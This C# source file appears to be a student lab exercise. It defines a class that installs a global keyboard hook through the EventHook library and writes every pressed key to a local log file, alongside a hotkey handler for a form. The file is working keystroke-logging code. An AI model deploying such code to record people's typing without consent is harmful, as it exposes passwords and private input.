using EventHook;
using System.Text.RegularExpressions;

namespace lab8
{
    class KeyBoardEventsLogger : EventLogger
    {
        // Exept white space esc backspace
        private const string SpecialSymbolsPattern = "^[^a-zA-Zа-яА-Я]?$";
        protected override string FileName => "KeyBoardEventsLogFile";

        private ShiftX _shiftF2;

        public void StartLogger(Form1 form1)
        {
            _shiftF2 = new ShiftX();

            KeyboardWatcher.OnKeyInput += (s, e) =>
            {
                if (e.KeyData.EventType.ToString().Equals("down"))  // key Down event
                {
                    WriteLog($"CryptKey: {GetKey(e.KeyData)} pressed.");
                }
                _shiftF2.AnalyseEvent(e.KeyData, form1);
            };

            KeyboardWatcher.Start();
        }

        public void StopLogger() => KeyboardWatcher.Stop();

        private string GetKey(KeyData keyData) =>
            Regex.IsMatch(keyData.UnicodeCharacter, SpecialSymbolsPattern) ?
                keyData.Keyname : keyData.UnicodeCharacter; // CryptKey name for special symbols
    }
}
